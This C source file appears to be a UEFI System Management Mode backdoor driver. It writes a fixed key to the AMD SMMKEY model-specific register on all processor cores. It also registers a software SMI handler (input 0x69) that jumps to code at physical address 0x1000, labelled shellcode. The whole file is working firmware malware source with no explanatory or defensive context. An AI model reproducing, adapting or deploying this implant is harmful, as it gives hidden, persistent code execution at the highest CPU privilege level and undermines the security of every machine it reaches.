#include <Uefi.h>

#include <Library/BaseLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/SmmServicesTableLib.h>

#include <Protocol/SmmSwDispatch2.h>
#include <Protocol/MpService.h>


#define SMMKEY_MSR  0xC0010119
#define SMMKEY_VAL  0x494F414354495645

#define SHELLCODE_ADDR  ((UINT64)0x1000)


VOID
EFIAPI
WriteSmmKey ()
{
  AsmWriteMsr64(SMMKEY_MSR, SMMKEY_VAL);
}


EFI_STATUS
EFIAPI
InitBackdoor ()
{

  EFI_STATUS Status = EFI_SUCCESS;
  EFI_MP_SERVICES_PROTOCOL *MpService = NULL;

  Status = gBS->LocateProtocol (
                    &gEfiMpServiceProtocolGuid,
                    NULL,
                    (VOID **)&MpService
                    );
  
  if (EFI_ERROR (Status)) {
    return Status;
  }
  
  MpService->StartupAllAPs(MpService, WriteSmmKey, FALSE, NULL, 0, NULL, NULL);
  WriteSmmKey();

  return EFI_SUCCESS;
}


// #pragma GCC push_options
// #pragma GCC optimize ("O0")
EFI_STATUS
EFIAPI
SmiHandler (
  IN EFI_HANDLE  DispatchHandle,
  IN CONST VOID  *Context         OPTIONAL,
  IN OUT VOID    *CommBuffer      OPTIONAL,
  IN OUT UINTN   *CommBufferSize  OPTIONAL
  )
{  
  void (*fp)() = (void (*)()) SHELLCODE_ADDR;
  fp();

  // asm("call %0" : : "r" (SHELLCODE_ADDR));
  // asm("xor %rax, %rax\n\t"
  //     "movq $4096, %rax\n\t"
  //     "call %rax");

  return EFI_SUCCESS;
}
// #pragma GCC pop_options

EFI_STATUS
EFIAPI
SmmBackdoorInit (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )

{
  EFI_STATUS Status = EFI_SUCCESS;
  EFI_SMM_SW_DISPATCH2_PROTOCOL  *SmmSwDispatch2 = NULL;
  EFI_SMM_SW_REGISTER_CONTEXT    SmmSwDispatchContext;
  EFI_HANDLE                     DispatchHandle;

  InitBackdoor();

  Status = gSmst->SmmLocateProtocol (
                    &gEfiSmmSwDispatch2ProtocolGuid,
                    NULL,
                    (VOID **)&SmmSwDispatch2
                    );

  if (EFI_ERROR (Status)) {
    return Status;
  }

  SmmSwDispatchContext.SwSmiInputValue = (UINTN)0x69;
  Status = SmmSwDispatch2->Register (
                             SmmSwDispatch2,
                             SmiHandler,
                             &SmmSwDispatchContext,
                             &DispatchHandle
                             );

  if (EFI_ERROR (Status)) {
    return Status;
  }

  return EFI_SUCCESS;
}
